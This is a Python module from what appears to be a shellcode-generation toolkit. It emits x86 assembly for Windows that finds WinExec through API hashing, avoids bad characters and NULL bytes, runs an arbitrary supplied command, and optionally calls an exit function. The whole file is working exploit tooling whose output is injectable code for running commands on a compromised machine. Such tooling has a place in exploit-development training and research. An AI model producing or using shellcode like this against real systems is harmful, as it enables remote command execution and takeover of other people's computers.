from coder import call_exit_func, find_and_call
from coder.util import find_hash_key, push_hash, push_string


def generate(cmd, bad_chars, exit_func, debug=False):
    hash_key = find_hash_key(
        [("KERNEL32.DLL", "WinExec")] + ([exit_func] if exit_func else []),
        bad_chars,
    )

    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_and_call.generate(hash_key)}

    create_cmd_string:
        {push_string(cmd, bad_chars)}
        mov ecx, esp

    call_winexec:                       // UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT uCmdShow);
        xor   edx, edx                  // edx = 0
        push  edx                       // uCmdShow = NULL
        push  ecx                       // lpCmdLine = &(cmd)
        {push_hash('KERNEL32.DLL', 'WinExec', hash_key)}
        call dword ptr [ebp+0x04]       // Call WinExec

    {call_exit_func.generate(exit_func, hash_key)}
    """
